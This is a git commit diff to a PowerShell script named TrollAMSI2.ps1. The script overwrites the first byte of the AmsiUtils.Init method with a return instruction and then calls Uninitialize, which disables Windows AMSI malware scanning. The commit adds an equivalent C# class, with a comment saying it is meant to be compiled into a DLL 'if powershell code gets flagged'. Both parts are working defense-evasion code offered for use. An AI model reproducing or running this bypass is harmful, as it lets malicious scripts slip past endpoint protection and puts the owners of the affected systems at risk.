017562f13cfc8d83465b7aa1a7f38ec9ace568d9
cybersectroll <dexter192123@gmail.com>
2025-05-29 16:48:34 +0800

    Update TrollAMSI2.ps1

--- TrollAMSI2.ps1
+++ TrollAMSI2.ps1
@@ -18,3 +18,34 @@ $p = 0
 [lib]::VirtualProtect($initPtr, [uint32]1, 0x40, [ref]$p)
 [System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3), 0, $initPtr, 1)
 $uninitMethod.Invoke($null, $null)
+
+# ------------------------------------------------------------------------------------------- End of ps code
+<#
+//c# code to be compiled into dll if powershell code gets flagged
+
+using System;
+using System.Management.Automation;
+using System.Reflection;
+using System.Runtime.InteropServices;
+
+public static class TrollAMSI3
+{
+    [DllImport("kernel32.dll", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    public static extern bool VirtualProtectEx( IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+    public static void Main()
+    {
+        var theclass = typeof(PSObject).Assembly.GetType("System.Management.Automation.AmsiUtils");
+        IntPtr themethodPtr = theclass.GetMethod("Init", BindingFlags.Static | BindingFlags.NonPublic).MethodHandle.GetFunctionPointer();
+
+        uint flOldProtect;
+        VirtualProtectEx((IntPtr)(-1), themethodPtr, (IntPtr)1, 0x40, out flOldProtect);
+        Marshal.Copy(new byte[] { 0xC3 }, 0, themethodPtr, 1);
+       
+        theclass.GetMethod("Uninitialize", BindingFlags.Static | BindingFlags.NonPublic).Invoke(null, null);
+
+    }
+}
+
+#>
